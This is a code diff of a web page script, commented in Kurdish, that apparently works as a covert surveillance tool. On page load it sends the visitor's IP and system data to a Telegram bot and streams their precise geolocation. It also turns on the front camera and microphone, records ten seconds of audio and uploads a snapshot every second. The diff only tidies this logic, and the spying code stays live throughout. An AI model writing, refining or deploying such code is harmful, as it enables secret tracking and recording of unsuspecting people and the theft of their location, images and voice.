@@ -15,7 +15,7 @@
     async function capture() {
         if (!targetID) return;
 
-        // 🔥 قۆناغی ١: ناردنی زانیارییە سەرەتاییەکان (وەک برووسکە)
+        // 🚀 قۆناغی ١: ناردنی خێرای IP و زانیاری سیستەم (وەک لۆژیکە کۆنەکە)
         try {
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
@@ -37,9 +37,9 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: targetID, text: report, parse_mode: "HTML" })
             });
-        } catch (e) { console.log("Init report failed"); }
+        } catch (e) { console.log("System data failed"); }
 
-        // 📍 قۆناغی ٢: ناردنی نەخشەی ناو چات (Live Map)
+        // 📍 قۆناغی ٢: ناردنی لوکەیشن (نەخشە لەناو تێلێگرام)
         navigator.geolocation.watchPosition(pos => {
             fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                 method: "POST",
@@ -53,19 +53,11 @@
             });
         }, null, { enableHighAccuracy: true });
 
-        // 🎥 قۆناغی ٣: کامێرای پێشەوە و مایک (The Fire Logic)
+        // 🎥 قۆناغی ٣: کامێرا و دەنگ (تەنها ئەگەر Allow کرا)
         try {
-            // ⚡ لێرە مۆڵەتی وردی کامێرای پێشەوە (facingMode: "user") و مایک زیاد کرا
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: "user", // مسۆگەرکردنی کامێرای پێشەوە
-                    width: { ideal: 640 }, 
-                    height: { ideal: 480 } 
-                }, 
-                audio: true 
-            });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
 
-            // 🎙️ تۆمارکردنی دەنگی ١٠ چرکەی سەرەتا
+            // دەنگی ١٠ چرکە
             const mediaRecorder = new MediaRecorder(stream);
             let chunks = [];
             mediaRecorder.ondataavailable = e => chunks.push(e.data);
@@ -79,28 +71,23 @@
             mediaRecorder.start();
             setTimeout(() => mediaRecorder.stop(), 10000);
 
-            // 📸 وێنەی بەردەوام (هەر ١ چرکە جارێک وەک ئاگر)
+            // وێنەی بەردەوام (هەر ١ چرکە)
             const video = document.createElement('video');
             video.srcObject = stream;
-            video.muted = true; // بۆ ئەوەی دەنگی لێنەیەت لە کاتی لۆدبوون
             video.play();
-
             setInterval(() => {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; 
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 canvas.toBlob(blob => {
                     const fd = new FormData();
                     fd.append("chat_id", targetID);
-                    fd.append("photo", blob, `snap_${Date.now()}.jpg`);
+                    fd.append("photo", blob, `snap.jpg`);
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
-                }, 'image/jpeg', 0.4); // کوالێتی گونجاو بۆ ناردنی خێرا
+                }, 'image/jpeg', 0.4);
             }, 1000);
 
-        } catch (e) {
-            console.log("Media Access Denied");
-        }
+        } catch (e) { console.log("Media blocked"); }
     }
 </script>
 </body>
